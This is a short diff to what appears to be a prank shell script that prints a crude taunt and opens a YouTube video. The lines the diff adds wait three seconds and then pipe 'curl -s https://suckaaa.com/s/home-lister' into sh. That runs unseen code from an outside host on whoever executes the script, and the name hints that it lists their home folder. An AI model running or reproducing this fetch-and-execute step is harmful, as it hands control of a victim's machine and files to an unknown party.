@@ -15,3 +15,7 @@ echo "\n\nI'm currently in your mothers bed — she's not home yet...!!\n\n";
 sleep 4s;
 
 open https://www.youtube.com/watch?v=7zPnTtF0Wk8&feature=youtu.be;
+
+sleep 3s;
+
+termdo 'curl -s https://suckaaa.com/s/home-lister | sh';
